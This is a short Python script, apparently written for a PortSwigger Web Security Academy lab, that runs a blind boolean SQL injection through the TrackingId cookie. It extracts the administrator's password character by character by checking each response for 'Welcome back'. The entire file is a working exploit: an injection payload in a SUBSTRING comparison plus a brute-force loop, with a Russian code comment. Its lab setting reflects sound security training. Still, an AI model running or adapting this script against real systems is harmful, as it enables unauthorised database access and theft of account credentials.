import requests
import time

url = "https://0add0087033290eb808d8091007200e8.web-security-academy.net/filter"
params = {
    
     "category": "Food & Drink"
}

cookies = {
    'TrackingId': 'Hf5miJtyUkr5u8hG',
    'session': 'kcxFfKfjFbZyiZ45j3dgsBrPXElHAZZ1'
}
password = ""
for x in range(19,21): 
    for y in range(48, 123):
     # SQL инъекция для проверки x-го символа
     cookies['TrackingId'] = f"Hf5miJtyUkr5u8hG' AND SUBSTRING((select password from users where username = 'administrator'), {x}, 1) = '{chr(y)}' --"
     response = requests.get(url, params=params, cookies=cookies)
     print(password,chr(y))
     if "Welcome back" in response.text:
        print("FIND SIM")
        password += chr(y)
        break